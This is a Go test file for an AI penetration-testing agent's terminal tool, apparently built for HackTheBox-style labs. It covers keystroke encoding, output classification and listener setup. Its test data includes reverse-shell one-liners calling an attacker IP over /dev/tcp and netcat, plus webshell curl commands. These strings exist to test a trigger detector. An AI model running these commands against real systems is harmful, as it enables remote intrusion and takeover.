package app

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"mauler/internal/settings"
)

func boolPtr(b bool) *bool { return &b }

func TestBuildTerminalSendPayload(t *testing.T) {
	cases := []struct {
		name    string
		args    terminalSendArgs
		want    string
		wantErr bool
	}{
		{name: "command gets enter by default", args: terminalSendArgs{Keys: "whoami"}, want: "whoami\r"},
		{name: "enter false leaves keys raw", args: terminalSendArgs{Keys: "partial", Enter: boolPtr(false)}, want: "partial"},
		{name: "trailing newline not doubled", args: terminalSendArgs{Keys: "ls\n"}, want: "ls\n"},
		{name: "ctrl-c only", args: terminalSendArgs{Control: "c"}, want: "\x03"},
		{name: "keys then ctrl-c", args: terminalSendArgs{Keys: "yes", Control: "c"}, want: "yes\r\x03"},
		{name: "control is case-insensitive", args: terminalSendArgs{Control: "ESC"}, want: "\x1b"},
		{name: "named arrow key", args: terminalSendArgs{Key: "up"}, want: "\x1b[A"},
		{name: "generic ctrl key", args: terminalSendArgs{Key: "ctrl-r"}, want: "\x12"},
		{name: "generic ctrl plus key", args: terminalSendArgs{Key: "Ctrl+C"}, want: "\x03"},
		{name: "key sequence mixes literal and named", args: terminalSendArgs{KeySequence: []string{"/", "admin", "enter"}}, want: "/admin\r"},
		{name: "unknown control errors", args: terminalSendArgs{Control: "x"}, wantErr: true},
		{name: "unknown named key errors", args: terminalSendArgs{Key: "needle"}, wantErr: true},
		{name: "empty produces empty", args: terminalSendArgs{}, want: ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := buildTerminalSendPayload(tc.args)
			if tc.wantErr {
				if err == nil {
					t.Fatalf("expected error, got %q", got)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if got != tc.want {
				t.Fatalf("got %q want %q", got, tc.want)
			}
		})
	}
}

func TestNormalizeTerminalSendArgsRepairsCommandKeySequence(t *testing.T) {
	args := terminalSendArgs{KeySequence: []string{"tmux new-session -d -s htb"}}
	normalizeTerminalSendArgs(&args)
	if args.Keys != "tmux new-session -d -s htb" {
		t.Fatalf("Keys=%q, want repaired command", args.Keys)
	}
	if len(args.KeySequence) != 0 {
		t.Fatalf("KeySequence should be cleared after repair: %#v", args.KeySequence)
	}
	got, err := buildTerminalSendPayload(args)
	if err != nil {
		t.Fatal(err)
	}
	if got != "tmux new-session -d -s htb\r" {
		t.Fatalf("payload=%q", got)
	}
}

func TestTerminalSendKeySequenceDecodesShellEntities(t *testing.T) {
	args := terminalSendArgs{KeySequence: []string{`curl -sk http://connected.htb/admin/ 2&amp;amp;gt;&amp;amp;1 &amp;amp;&amp;amp; echo ok`}}
	normalizeTerminalSendArgs(&args)
	if args.Keys != `curl -sk http://connected.htb/admin/ 2>&1 && echo ok` {
		t.Fatalf("Keys=%q, want decoded shell command", args.Keys)
	}
}

func TestTerminalSendDetectsInterruptKeySequences(t *testing.T) {
	if !terminalSendHasInterrupt(terminalSendArgs{KeySequence: []string{"Ctrl+C", "Enter"}}) {
		t.Fatal("Ctrl+C key_sequence should count as an interrupt")
	}
	if !terminalSendHasInterrupt(terminalSendArgs{Control: "c"}) {
		t.Fatal("control=c should count as an interrupt")
	}
	if terminalSendHasInterrupt(terminalSendArgs{Key: "c"}) {
		t.Fatal("literal key c should not count as Ctrl-C")
	}
}

func TestNormalizeTerminalSendArgsKeepsInteractiveKeySequence(t *testing.T) {
	args := terminalSendArgs{KeySequence: []string{"/", "needle", "enter"}}
	normalizeTerminalSendArgs(&args)
	if args.Keys != "" || len(args.KeySequence) != 3 {
		t.Fatalf("interactive sequence should be unchanged: %#v", args)
	}
	got, err := buildTerminalSendPayload(args)
	if err != nil {
		t.Fatal(err)
	}
	if got != "/needle\r" {
		t.Fatalf("payload=%q", got)
	}
}

func TestNormalizeTerminalSendArgsRepairsKeysEnter(t *testing.T) {
	args := terminalSendArgs{Keys: "enter"}
	normalizeTerminalSendArgs(&args)
	if args.Keys != "" || args.Key != "enter" {
		t.Fatalf("keys=enter should become key=enter: %#v", args)
	}
	got, err := buildTerminalSendPayload(args)
	if err != nil {
		t.Fatal(err)
	}
	if got != "\r" {
		t.Fatalf("payload=%q, want enter", got)
	}
}

func TestNormalizeTerminalSendArgsRepairsLegacyDataCommand(t *testing.T) {
	args := terminalSendArgs{Data: `ping -c 2 connected.htb 2>&1`}
	normalizeTerminalSendArgs(&args)
	if args.Command != `ping -c 2 connected.htb 2>&1` {
		t.Fatalf("data should become command: %#v", args)
	}
}

func TestNormalizeTerminalSendArgsRepairsParameterDataInID(t *testing.T) {
	args := terminalSendArgs{ID: "shell-verify</id>\n<parameter=data>ping -c 2 connected.htb 2>&1"}
	normalizeTerminalSendArgs(&args)
	if args.Command != `ping -c 2 connected.htb 2>&1` {
		t.Fatalf("parameter data in id should become command: %#v", args)
	}
}

func TestTerminalSendEmptyReadShapeSuggestsTerminalRead(t *testing.T) {
	tool := &terminalSendTool{app: &App{}}
	_, err := tool.Run(context.Background(), []byte(`{"lines":5,"wait_ms":1000}`))
	if err == nil {
		t.Fatal("expected empty terminal_send to error")
	}
	msg := err.Error()
	if !strings.Contains(msg, "You likely meant terminal_read") || !strings.Contains(msg, `"lines":5`) || !strings.Contains(msg, `"wait_ms":1000`) {
		t.Fatalf("missing terminal_read recovery hint: %v", err)
	}
}

func TestTerminalScrollbackTail(t *testing.T) {
	s := newTerminalScrollback(3)
	for _, l := range []string{"a", "b", "c", "d"} {
		s.append(l)
	}
	if got := s.length(); got != 3 {
		t.Fatalf("length = %d, want 3 (oldest trimmed)", got)
	}
	tail := s.tail(2)
	if strings.Join(tail, ",") != "c,d" {
		t.Fatalf("tail(2) = %v, want [c d]", tail)
	}
	if all := s.tail(0); strings.Join(all, ",") != "b,c,d" {
		t.Fatalf("tail(0) = %v, want [b c d]", all)
	}
	if got := strings.Join(s.since(2, 10), ","); got != "d" {
		t.Fatalf("since(2) = %q, want d", got)
	}
}

func TestWaitForTerminalOutputReturnsWhenOutputArrives(t *testing.T) {
	scroll := newTerminalScrollback(10)
	sess := &shellSession{scroll: scroll, screen: newTerminalScreen(80, 10)}
	before := scroll.length()
	beforeGen := terminalScreenGeneration(sess)
	go func() {
		time.Sleep(30 * time.Millisecond)
		scroll.append("ready")
	}()
	started := time.Now()
	waitForTerminalOutput(context.Background(), sess, before, beforeGen, time.Second)
	if elapsed := time.Since(started); elapsed > 500*time.Millisecond {
		t.Fatalf("wait did not return early after output arrived: %s", elapsed)
	}
}

func TestWaitForTerminalOutputReturnsWhenScreenRepaints(t *testing.T) {
	sess := &shellSession{scroll: newTerminalScrollback(10), screen: newTerminalScreen(80, 10)}
	beforeLen := sess.scroll.length()
	beforeGen := terminalScreenGeneration(sess)
	go func() {
		time.Sleep(30 * time.Millisecond)
		sess.screen.write([]byte("\rprogress 50"))
	}()
	started := time.Now()
	waitForTerminalOutput(context.Background(), sess, beforeLen, beforeGen, time.Second)
	if elapsed := time.Since(started); elapsed > 500*time.Millisecond {
		t.Fatalf("wait did not return early after screen repaint: %s", elapsed)
	}
}

func TestWaitForTerminalPromptReturnsWhenOSCMarkerArrives(t *testing.T) {
	sess := &shellSession{}
	go func() {
		time.Sleep(30 * time.Millisecond)
		updateShellSessionOSCState(sess, []byte("\x1b]133;D;3\x07\x1b]133;P;cwd=/tmp\x07\x1b]133;A\x07"))
	}()
	started := time.Now()
	waitForTerminalPrompt(context.Background(), sess, time.Second)
	if elapsed := time.Since(started); elapsed > 500*time.Millisecond {
		t.Fatalf("wait did not return early after prompt marker: %s", elapsed)
	}
	if got := terminalExitLabel(sess); got != "3" {
		t.Fatalf("exit label = %q, want 3", got)
	}
	if got := terminalCWDLabel(sess); got != "/tmp" {
		t.Fatalf("cwd label = %q, want /tmp", got)
	}
}

func TestClampReadWaitDefaultsToInstant(t *testing.T) {
	if got := clampReadWaitMs(nil); got != 0 {
		t.Fatalf("terminal_read default wait = %s, want instant", got)
	}
	v := 123
	if got := clampReadWaitMs(&v); got != 123*time.Millisecond {
		t.Fatalf("terminal_read explicit wait = %s", got)
	}
}

func TestFormatTerminalScreenEmpty(t *testing.T) {
	got := formatTerminalScreen(newTerminalScrollback(0), 10)
	if !strings.Contains(got, "terminal idle") {
		t.Fatalf("empty screen should report idle, got %q", got)
	}
}

func TestFormatTerminalViewHistoryMode(t *testing.T) {
	s := newTerminalScrollback(10)
	s.append("alpha")
	s.append("beta")
	got := formatTerminalView(&shellSession{scroll: s}, 2, "history")
	if !strings.Contains(got, "terminal history") || !strings.Contains(got, "alpha") || !strings.Contains(got, "beta") {
		t.Fatalf("history mode should return scrollback history, got %q", got)
	}
}

func TestFormatTerminalScreenUsesRenderedScreen(t *testing.T) {
	sess := &shellSession{scroll: newTerminalScrollback(10), screen: newTerminalScreen(40, 5)}
	sess.scroll.append("progress 10")
	sess.scroll.append("progress 20")
	sess.screen.write([]byte("progress 10\rprogress 20\x1b[K"))
	got := formatTerminalView(sess, 5, "screen")
	if !strings.Contains(got, "progress 20") || strings.Contains(got, "progress 10\nprogress 20") {
		t.Fatalf("screen mode should return rendered in-place state, got %q", got)
	}
}

func TestFormatTerminalSearchViewHistory(t *testing.T) {
	s := newTerminalScrollback(10)
	s.append("22/tcp open ssh")
	s.append("80/tcp open http Apache")
	s.append("443/tcp open https Apache")
	got, matches := formatTerminalSearchView(&shellSession{scroll: s}, 5, "history", `Apache`)
	if matches != 2 || !strings.Contains(got, "80/tcp") || !strings.Contains(got, "443/tcp") || strings.Contains(got, "22/tcp") {
		t.Fatalf("unexpected terminal search result matches=%d got=%q", matches, got)
	}
}

func TestTerminalReadCanSaveSearchResultHandle(t *testing.T) {
	t.Setenv("MAULER_CONFIG_DIR", t.TempDir())
	app := &App{}
	s := newTerminalScrollback(10)
	s.append("root flag: not here")
	s.append("uid=0(root) gid=0(root)")
	app.shellSess = &shellSession{id: "test-shell", scroll: s, screen: newTerminalScreen(80, 10)}
	tool := &terminalReadTool{app: app}
	raw, _ := json.Marshal(terminalReadArgs{Mode: "history", Grep: "uid=0", Lines: 5})
	got, err := tool.Run(context.Background(), raw)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "matches: 1") || !strings.Contains(got, "result_id=") || !strings.Contains(got, "/terminal_read-") || !strings.Contains(got, "uid=0(root)") {
		t.Fatalf("terminal_read search/save result missing expected pieces:\n%s", got)
	}
}

func TestClassifyTerminalRunState(t *testing.T) {
	cases := []struct {
		name    string
		command string
		before  int
		after   int
		tail    []string
		want    string
	}{
		{name: "no output", command: "nmap -sV 10.10.10.1", before: 2, after: 2, want: "no_output_yet"},
		{name: "password prompt", command: "ssh root@box", before: 1, after: 2, tail: []string{"Password:"}, want: "interactive_prompt"},
		{name: "shell prompt", command: "id", before: 1, after: 3, tail: []string{"uid=0(root)", "root@kali:/tmp# "}, want: "prompt_or_idle"},
		{name: "long scan output", command: "ffuf -u http://box/FUZZ -w words", before: 1, after: 5, tail: []string{":: Progress: [100/1000] :: Job [1/1]"}, want: "running"},
		{name: "simple output", command: "cat file", before: 1, after: 2, tail: []string{"hello"}, want: "output_ready"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := classifyTerminalState(tc.command, tc.tail, tc.before, tc.after); got != tc.want {
				t.Fatalf("state = %q, want %q", got, tc.want)
			}
		})
	}
}

func TestTerminalRunResultIncludesStateAndHint(t *testing.T) {
	s := &shellSession{id: "shell-test", scroll: newTerminalScrollback(10)}
	s.scroll.append("root@kali:/tmp# ")
	got := formatTerminalRunResult(s, "id", 0, 10)
	if !strings.Contains(got, "terminal_send session=shell-test") || !strings.Contains(got, "state=prompt_or_idle") || !strings.Contains(got, "next:") {
		t.Fatalf("unexpected terminal_send result:\n%s", got)
	}
}

func TestTerminalRunResultUsesOnlyCommandDelta(t *testing.T) {
	s := &shellSession{id: "shell-test", scroll: newTerminalScrollback(20)}
	s.scroll.append("uid=999(asterisk) gid=1000(asterisk)")
	s.scroll.append("/home/asterisk")
	before := s.scroll.length()
	s.scroll.append("ls /root/")
	s.scroll.append("root.txt")
	s.scroll.append("root@kali:/work# ")
	got := formatTerminalRunResult(s, "ls /root/", before, 10)
	if strings.Contains(got, "uid=999") || strings.Contains(got, "/home/asterisk") {
		t.Fatalf("terminal_send result leaked old scrollback:\n%s", got)
	}
	if !strings.Contains(got, "ls /root/") || !strings.Contains(got, "root.txt") || !strings.Contains(got, "terminal command output") {
		t.Fatalf("terminal_send result missing command delta:\n%s", got)
	}
}

func TestTerminalReadHistoryWithoutGrepDoesNotDumpScrollback(t *testing.T) {
	app := &App{}
	s := newTerminalScrollback(20)
	s.append("old secret line")
	s.append("another stale line")
	app.shellSess = &shellSession{id: "test-shell", scroll: s, screen: newTerminalScreen(80, 10)}
	app.shellSess.screen.write([]byte("current prompt$ "))
	tool := &terminalReadTool{app: app}
	raw, _ := json.Marshal(terminalReadArgs{Mode: "history", Lines: 10})
	got, err := tool.Run(context.Background(), raw)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "old secret line") || strings.Contains(got, "another stale line") {
		t.Fatalf("history without grep should not dump scrollback:\n%s", got)
	}
	if !strings.Contains(got, "terminal history not dumped") || !strings.Contains(got, "current prompt") {
		t.Fatalf("history without grep should return guidance plus screen:\n%s", got)
	}
}

func TestCleanTerminalLinesDropsScanNoise(t *testing.T) {
	in := []string{
		"\r:: Progress: [1/4614] :: 0 req/sec ::\radmin [Status: 200]",
		":: Progress: [20/4614] :: 0 req/sec ::",
		".bashrc [Status: 403]",
		".bashrc [Status: 403]",
	}
	out := cleanTerminalLines(in)
	joined := strings.Join(out, "\n")
	if !strings.Contains(joined, "admin [Status: 200]") {
		t.Fatalf("finding dropped: %q", joined)
	}
	if strings.Contains(joined, ":: Progress:") || strings.Contains(joined, "req/sec") {
		t.Fatalf("progress noise survived: %q", joined)
	}
	if strings.Count(joined, ".bashrc [Status: 403]") != 1 {
		t.Fatalf("duplicate not collapsed: %q", joined)
	}
}

func TestClassifyTerminalStatePromptWinsOverNoOutput(t *testing.T) {
	// The bug: a finished command (prompt back) with no NEW lines since it was sent
	// was mislabeled "no_output_yet", looping the model on terminal_read waits.
	if got := classifyTerminalState("ls -la /etc", []string{"root@HomePc:~/HTB_writeups$ "}, 5, 5); got != "prompt_or_idle" {
		t.Fatalf("finished command should be prompt_or_idle, got %q", got)
	}
	// genuinely no output and no prompt -> no_output_yet
	if got := classifyTerminalState("exploit.py --lport 4444", nil, 5, 5); got != "no_output_yet" {
		t.Fatalf("blocked command with no prompt should be no_output_yet, got %q", got)
	}
}

func TestClassifyTerminalStateUsesMarkerPromptReady(t *testing.T) {
	exit := 0
	s := &shellSession{promptReady: true, lastExit: &exit, lastCWD: "/tmp", lastDoneAt: time.Now()}
	if got := classifyTerminalStateForSession(s, "id", nil, 5, 5); got != "prompt_or_idle" {
		t.Fatalf("marker-ready session should be prompt_or_idle, got %q", got)
	}
	if got := terminalExitLabel(s); got != "0" {
		t.Fatalf("exit label = %q, want 0", got)
	}
	if got := terminalCWDLabel(s); got != "/tmp" {
		t.Fatalf("cwd label = %q, want /tmp", got)
	}
}

func TestSharedTerminalAnyMarkers(t *testing.T) {
	if cwd, ok := sharedTerminalAnyCWD("__MAULER_CWD_abc__/home/user/project"); !ok || cwd != "/home/user/project" {
		t.Fatalf("cwd marker parse failed: cwd=%q ok=%v", cwd, ok)
	}
	if code, ok := sharedTerminalAnyDone("__MAULER_DONE_abc:7"); !ok || code != 7 {
		t.Fatalf("done marker parse failed: code=%d ok=%v", code, ok)
	}
	if _, ok := sharedTerminalAnyDone("__MAULER_DONE_abc:not-a-code"); ok {
		t.Fatal("invalid done marker should not parse")
	}
}

func TestShellSessionOSCParserHandlesSplitMarkers(t *testing.T) {
	sess := &shellSession{}
	updateShellSessionOSCState(sess, []byte("noise\x1b]133;D;"))
	if terminalSessionPromptReady(sess) {
		t.Fatal("partial marker should not set prompt ready")
	}
	updateShellSessionOSCState(sess, []byte("9\x07\x1b]133;P;cwd=/work\x07"))
	if !terminalSessionPromptReady(sess) {
		t.Fatal("done marker should set prompt ready")
	}
	if got := terminalExitLabel(sess); got != "9" {
		t.Fatalf("exit label = %q, want 9", got)
	}
	if got := terminalCWDLabel(sess); got != "/work" {
		t.Fatalf("cwd label = %q, want /work", got)
	}
}

func TestClassifyTerminalStateIgnoresHTMLPasswordInputs(t *testing.T) {
	tail := []string{
		`<div id="login_form">`,
		`<input type="text" name="username">`,
		`<input type="password" name="password">`,
		`</form>`,
	}
	if got := classifyTerminalState("curl https://box/admin/config.php", tail, 1, 5); got == "interactive_prompt" {
		t.Fatalf("HTML password field should not be treated as terminal prompt")
	}
	if got := classifyTerminalState("ssh root@box", []string{"Password:"}, 1, 2); got != "interactive_prompt" {
		t.Fatalf("real password prompt should still be interactive_prompt, got %q", got)
	}
}

func TestEndsWithShellPromptSkipsArt(t *testing.T) {
	if !endsWithShellPrompt([]string{"output", "?????????? ????? ??????????????", "root@kali:/tmp# "}) {
		t.Fatal("should detect prompt under art")
	}
	if endsWithShellPrompt([]string{"?????????? ????? ?????? ?????????", "still running"}) {
		t.Fatal("no prompt present; should be false")
	}
	if !endsWithShellPrompt([]string{"svc@box:/var/www$"}) {
		t.Fatal("should detect $ prompt")
	}
}

func TestSharedTerminalReadyAcceptsRecentPromptWithPreviewAfterIt(t *testing.T) {
	s := &shellSession{id: "shell-test", scroll: newTerminalScrollback(20)}
	for _, line := range []string{
		"root@HomePc:~/HTB_writeups$ ",
		"[AI isolated fallback result: shell]",
		"[wsl exit 0, 259ms]",
	} {
		s.scroll.append(line)
	}
	if !sharedTerminalReadyForWrappedCommand(s) {
		t.Fatal("terminal should be ready when a recent shell prompt is followed only by UI/result preview lines")
	}
}

func TestSharedTerminalReadyRejectsRecentInteractivePrompt(t *testing.T) {
	s := &shellSession{id: "shell-test", scroll: newTerminalScrollback(20)}
	s.scroll.append("Password:")
	if sharedTerminalReadyForWrappedCommand(s) {
		t.Fatal("terminal should stay busy while an interactive password prompt is visible")
	}
}

func TestRecoverSharedTerminalAlreadyReady(t *testing.T) {
	s := &shellSession{id: "shell-test", scroll: newTerminalScrollback(20)}
	s.scroll.append("root@kali:/work# ")
	app := &App{shellSess: s}
	got, err := app.RecoverSharedTerminal()
	if err != nil {
		t.Fatal(err)
	}
	if got.Status != "ready" || !strings.Contains(got.Summary, "already") {
		t.Fatalf("unexpected recovery result: %#v", got)
	}
}

func TestSharedTerminalStateSnapshot(t *testing.T) {
	t.Run("missing", func(t *testing.T) {
		got := sharedTerminalStateSnapshot(nil)
		if got.State != "missing" {
			t.Fatalf("state=%q", got.State)
		}
	})
	t.Run("ready", func(t *testing.T) {
		s := &shellSession{id: "shell-ready", scroll: newTerminalScrollback(20)}
		s.scroll.append("root@kali:/work# ")
		got := sharedTerminalStateSnapshot(s)
		if got.State != "ready" {
			t.Fatalf("state=%q summary=%q", got.State, got.Summary)
		}
	})
	t.Run("running", func(t *testing.T) {
		s := &shellSession{id: "shell-running", scroll: newTerminalScrollback(20)}
		s.runMu.Lock()
		defer s.runMu.Unlock()
		got := sharedTerminalStateSnapshot(s)
		if got.State != "running" {
			t.Fatalf("state=%q summary=%q", got.State, got.Summary)
		}
	})
	t.Run("interactive prompt", func(t *testing.T) {
		s := &shellSession{id: "shell-prompt", scroll: newTerminalScrollback(20)}
		s.scroll.append("Password:")
		got := sharedTerminalStateSnapshot(s)
		if got.State != "interactive_prompt" {
			t.Fatalf("state=%q summary=%q", got.State, got.Summary)
		}
	})
	t.Run("listener", func(t *testing.T) {
		s := &shellSession{id: "shell-listener", scroll: newTerminalScrollback(20)}
		s.scroll.append("Ncat: Listening on 0.0.0.0:4444")
		got := sharedTerminalStateSnapshot(s)
		if got.State != "listener" {
			t.Fatalf("state=%q summary=%q", got.State, got.Summary)
		}
	})
	t.Run("connected", func(t *testing.T) {
		s := &shellSession{id: "shell-connected", scroll: newTerminalScrollback(20)}
		s.scroll.append("Ncat: Connection received from 10.129.23.158:4444")
		s.scroll.append("uid=999(asterisk) gid=1000(asterisk)")
		got := sharedTerminalStateSnapshot(s)
		if got.State != "connected" {
			t.Fatalf("state=%q summary=%q", got.State, got.Summary)
		}
	})
	t.Run("curl whoami command is not connected", func(t *testing.T) {
		s := &shellSession{id: "shell-curl", scroll: newTerminalScrollback(20)}
		s.scroll.append(`root@HomePc:~/HTB_writeups$ curl -sk https://connected.htb/shell.php?cmd=id%3Bwhoami%3Bhostname 2>&1 | head -5`)
		got := sharedTerminalStateSnapshot(s)
		if got.State == "connected" {
			t.Fatalf("curl command line containing whoami must not be classified connected: summary=%q lines=%#v", got.Summary, got.Lines)
		}
	})
	t.Run("webshell uid output is not connected", func(t *testing.T) {
		s := &shellSession{id: "shell-webshell", scroll: newTerminalScrollback(20)}
		s.scroll.append(`root@HomePc:~/HTB_writeups$ curl -sk "https://connected.htb/shell.php?cmd=id"`)
		s.scroll.append(`uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)`)
		got := sharedTerminalStateSnapshot(s)
		if got.State == "connected" {
			t.Fatalf("webshell uid output must not be classified connected: summary=%q lines=%#v", got.Summary, got.Lines)
		}
	})
	t.Run("curl verbose connected line is not session", func(t *testing.T) {
		s := &shellSession{id: "shell-curl-verbose", scroll: newTerminalScrollback(20)}
		s.scroll.append(`* Connected to connected.htb (10.129.26.26) port 443`)
		got := sharedTerminalStateSnapshot(s)
		if got.State == "connected" {
			t.Fatalf("curl verbose connection must not be classified connected: summary=%q lines=%#v", got.Summary, got.Lines)
		}
	})
	t.Run("stale connection before local prompt is not connected", func(t *testing.T) {
		s := &shellSession{id: "shell-stale", scroll: newTerminalScrollback(20)}
		s.scroll.append("Ncat: Connection received from 10.129.23.158:4444")
		s.scroll.append(`root@HomePc:~/HTB_writeups$ curl -sk https://connected.htb/`)
		got := sharedTerminalStateSnapshot(s)
		if got.State == "connected" {
			t.Fatalf("stale connection line before local prompt must not be connected: summary=%q lines=%#v", got.Summary, got.Lines)
		}
	})
}

func TestBuildListenerInvocationWindows(t *testing.T) {
	cfg := settings.DefaultSettings()
	cfg.Environment.ListenerBackend = "windows_powershell"
	cfg.Environment.ListenerCommand = "ncat.exe -lvp {port}"
	cfg.Environment.LHOSTSource = "manual"
	cfg.Environment.ManualLHOST = "10.10.15.223"
	inv, lhost, err := buildListenerInvocation(cfg, 4444, "")
	if err != nil {
		t.Fatal(err)
	}
	if lhost != "10.10.15.223" {
		t.Fatalf("lhost=%q", lhost)
	}
	if !strings.Contains(inv, "powershell.exe") || !strings.Contains(inv, "ncat.exe -lvp 4444") {
		t.Fatalf("unexpected invocation: %q", inv)
	}
}

func TestLooksLikeReverseShellTrigger(t *testing.T) {
	yes := []string{"python3 exploit.py --lhost 10.10.15.223 --lport 4444", "bash -i >& /dev/tcp/10.10.15.223/4444 0>&1", "nc 10.10.15.223 4444 -e /bin/sh"}
	for _, c := range yes {
		if !looksLikeReverseShellTrigger(c) {
			t.Errorf("expected trigger: %q", c)
		}
	}
	no := []string{"ncat.exe -lvp 4444", "nmap -sV 10.10.10.5", "ls -la"}
	for _, c := range no {
		if looksLikeReverseShellTrigger(c) {
			t.Errorf("did not expect trigger: %q", c)
		}
	}
}
